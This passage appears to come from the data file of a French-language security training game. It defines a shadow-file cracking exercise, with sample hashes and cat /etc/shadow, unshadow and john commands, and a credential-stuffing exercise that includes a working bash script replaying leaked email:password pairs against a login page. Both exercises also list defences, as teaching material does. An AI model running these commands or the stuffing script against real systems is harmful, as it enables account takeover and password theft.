alice:$6$saltalice1$n7gDk5bnMGmCLbRIOjNDRmBHByAIGJpFKKjN2aKGHT9wEbAIjXdIZTNbzjnFXmA.qtI3C/6ZAkrKNsRKHFpC0:19800:0:99999:7:::
bob:$1$saltbob12$vCBMvVEr5NAuqHc3W8UoF0:19800:0:99999:7:::
charlie:$6$saltcharl$3qRJx5BJtSYqBhiHdBnMIOoaqJNECGGKhXHdFTmL9W1e7vRKz5H2oJk4DtHXd6JcNmFsXqNiZMxNPy8eTXtg50:19800:0:99999:7:::
svchttp:$1$saltsvc1$kBapHPDiLg.GX.ZsYMFiGq:19800:0:99999:7:::`,
      'shadow_format_explained.txt': `=== FORMAT /etc/shadow EXPLIQUÉ ===

STRUCTURE D'UNE LIGNE SHADOW
  username:$id$salt$hash:lastchg:min:max:warn:inactive:expire

  Champ 1  : nom d'utilisateur
  Champ 2  : hash du mot de passe
  Champ 3  : date dernier changement (jours depuis epoch)
  Champ 4  : âge minimum (jours avant de pouvoir changer)
  Champ 5  : âge maximum (jours avant expiration)
  Champ 6  : jours d'avertissement avant expiration
  Champ 7  : jours d'inactivité tolérés après expiration
  Champ 8  : date d'expiration du compte

FORMAT DU HASH : $id$salt$hash
  $1$   = md5crypt        (faible, éviter)
  $2a$  = bcrypt          (coûteux, recommandé)
  $5$   = sha256crypt     (acceptable)
  $6$   = sha512crypt     (standard Linux moderne)
  $y$   = yescrypt        (Debian/Ubuntu récent)
  *     = compte désactivé (pas de login possible)
  !     = compte verrouillé

IDENTIFIER LE FORMAT DANS L'EXERCICE
  alice   : $6$ → sha512crypt → John format sha512crypt
  bob     : $1$ → md5crypt    → John format md5crypt
  svchttp : $1$ → md5crypt    → cible prioritaire (hash faible)

WORKFLOW COMPLET
  # 1. Obtenir les deux fichiers (nécessite root ou fuite)
  cat /etc/passwd > passwd.txt
  cat /etc/shadow > shadow.txt   # Requiert root !

  # 2. Combiner avec unshadow
  unshadow passwd.txt shadow.txt > combined.txt

  # 3. Cracker avec John
  john combined.txt
  john combined.txt --wordlist=rockyou.txt

  # 4. Afficher les résultats
  john --show combined.txt

  # 5. Cibler un format spécifique
  john --format=sha512crypt combined.txt --wordlist=rockyou.txt

CONTRE-MESURES
  - Permissions strictes sur /etc/shadow (640 ou 000)
  - Utiliser yescrypt ou bcrypt (coût computationnel élevé)
  - Mots de passe longs et aléatoires (>14 chars)
  - Surveiller l'accès à /etc/shadow dans les logs`
    },
    validation: [
      { type: 'command', value: 'unshadow', description: 'Combiner passwd et shadow avec unshadow' }
    ],
    story: "🐧 Un audit post-incident révèle qu'un attaquant a exfiltré `/etc/passwd` et `/etc/shadow` d'un serveur Linux. Reproduis l'attaque en lab : combine les fichiers avec unshadow, identifie les comptes aux hashes faibles, et crack-les avec John. Le compte `svchttp` a l'air suspect..."
  },

  {
    id: 130,
    title: "Credential Stuffing",
    difficulty: 'advanced',
    category: "Auth Attacks",
    objective: "Comprendre le credential stuffing et comment s'en défendre",
    description: "Le credential stuffing exploite les bases de données de credentials volées lors de fuites de données passées. Comme beaucoup d'utilisateurs réutilisent leurs mots de passe sur plusieurs services, des paires email:password valides sur un service compromis fonctionnent souvent sur d'autres. Contrairement au brute-force, les credentials sont déjà connus — on ne devine pas, on rejoue. La défense repose sur la MFA, la détection d'anomalies (IPs inconnues, gros volumes de logins), et les services de monitoring de fuites comme Have I Been Pwned.",
    commands: ['curl', 'for'],
    hints: [
      "Simuler du credential stuffing en bash : `while IFS=: read user pass; do response=$(curl -s -d \"email=$user&password=$pass\" http://target/login); echo \"$response\" | grep -q 'success' && echo \"VALID: $user:$pass\"; sleep 1; done < leaked_creds.txt`",
      "Détecter si tu es dans une fuite : `curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/EMAIL'` — ou utilise l'outil CLI `hibp`",
      "Tester le rate limiting : `for i in $(seq 1 20); do curl -s -o /dev/null -w \"%{http_code}\\n\" -d 'email=test@test.com&password=test' http://target/login; done` — cherche les 429 Too Many Requests"
    ],
    fileSystem: {
      'credential_stuffing_explained.txt': `=== CREDENTIAL STUFFING : THÉORIE ET PRATIQUE ===

DÉFINITION
  Le credential stuffing utilise des paires identifiant:mot de passe
  issues de fuites de données pour tenter de se connecter sur
  d'autres services. Fonctionne car ~65% des gens réutilisent
  leurs mots de passe (source : Google Security Survey 2019).

DIFFÉRENCES AVEC LES AUTRES ATTAQUES
  ┌───────────────────┬────────────────────────────────────────┐
  │ Attaque           │ Description                            │
  ├───────────────────┼────────────────────────────────────────┤
  │ Brute-force       │ Essaie des combis aléatoires           │
  │ Password spraying │ 1 pass connu → N comptes               │
  │ Credential stuff. │ N paires connues → N services          │
  └───────────────────┴────────────────────────────────────────┘

SOURCES DE DONNÉES VOLÉES (légalement disponibles pour défense)
  - Have I Been Pwned (haveibeenpwned.com) : ~13 milliards de comptes
  - DeHashed.com : recherche dans les dumps publics
  - Intelligence de menaces payantes (Recorded Future, etc.)

INDICATEURS DE DÉTECTION POUR LES DÉFENSEURS
  - Volume élevé de logins échoués en peu de temps
  - Logins depuis des IPs inconnues / nouveaux pays
  - Logins depuis des IPs dans des listes noires
  - Ratio login_success/login_fail anormalement bas
  - User-Agents inhabituels (bots déguisés)
  - Fingerprinting navigateur incohérent

MÉCANISMES DE DÉFENSE
  1. Multi-Factor Authentication (MFA) → bloque ~99.9% des stuffing
  2. CAPTCHA adaptatif (déclenché par comportement suspect)
  3. Rate limiting par IP + empreinte navigateur
  4. Détection de credential dumps (Have I Been Pwned API)
  5. Alertes email/SMS lors de connexions inhabituelles
  6. Device fingerprinting et scoring de risque`,
      'stuffing_loop_template.sh': `#!/bin/bash
# Template éducatif — credential stuffing simulation
# Usage : script.sh credentials.txt http://target.com/login
# Format credentials.txt : email:password (une paire par ligne)

CREDFILE="\${1:-leaked_creds.txt}"
TARGET="\${2:-http://target.com/login}"
DELAY=2  # Secondes entre chaque tentative (respecter le rate limiting)

echo "[*] Credential Stuffing Simulation"
echo "[*] Cible : $TARGET"
echo "[*] Credentials : $CREDFILE"
echo "[*] Délai : \${DELAY}s entre tentatives"
echo "---"

TOTAL=0
HITS=0

while IFS=':' read -r email password; do
  # Ignorer les lignes vides ou commentaires
  [[ -z "$email" || "$email" == \#* ]] && continue

  TOTAL=$((TOTAL + 1))

  # Tentative de connexion
  HTTP_CODE=$(curl -s -o /tmp/response.txt -w "%{http_code}" \\
    -X POST \\
    -H "User-Agent: Mozilla/5.0 (compatible browser)" \\
    -d "email=\${email}&password=\${password}" \\
    "$TARGET")

  RESPONSE=$(cat /tmp/response.txt)

  # Analyser la réponse
  if [[ "$HTTP_CODE" == "302" ]] || echo "$RESPONSE" | grep -qi "dashboard\|welcome\|logout"; then
    echo "[+] VALIDE : \${email}:\${password}"
    HITS=$((HITS + 1))
  elif [[ "$HTTP_CODE" == "429" ]]; then
    echo "[!] Rate limited ! Pause 60s..."
    sleep 60
  else
    echo "[-] Invalide : \${email}"
  fi

  sleep "$DELAY"

done < "$CREDFILE"

echo "---"
echo "[*] Résultats : $HITS valides sur $TOTAL testés"

# Nettoyage
rm -f /tmp/response.txt`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Tester des credentials via curl' }
    ],
    story: "💥 Une fuite massive vient d'être publiée sur un forum underground : 50 000 paires email:password d'un site e-commerce. Ton client utilise les mêmes domaines email. Comprends le mécanisme du credential stuffing, simule l'attaque en lab, puis aide l'équipe sécurité à mettre en place les bonnes défenses avant que l'attaquant ne frappe !"
  },
];
